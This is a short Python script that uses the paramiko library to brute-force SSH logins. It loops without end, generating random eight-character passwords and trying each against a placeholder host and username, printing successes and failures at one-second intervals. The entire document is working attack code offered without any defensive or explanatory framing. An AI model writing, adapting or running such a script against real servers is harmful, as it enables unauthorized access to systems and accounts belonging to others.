import paramiko
import random
import string
import time

def generate_random_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

hostname = 'host_ip'
port = 22
username = 'host_username'

while True:
    password = generate_random_password()
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname, port, username, password)
        print(f"SSH connection established with password: {password}")
        ssh_client.close()
    except Exception as e:
        print(f"Failed to connect with password: {password}, Error: {e}")
    
    time.sleep(1)  # Adjust sleep time as needed to control the rate of connection attempts
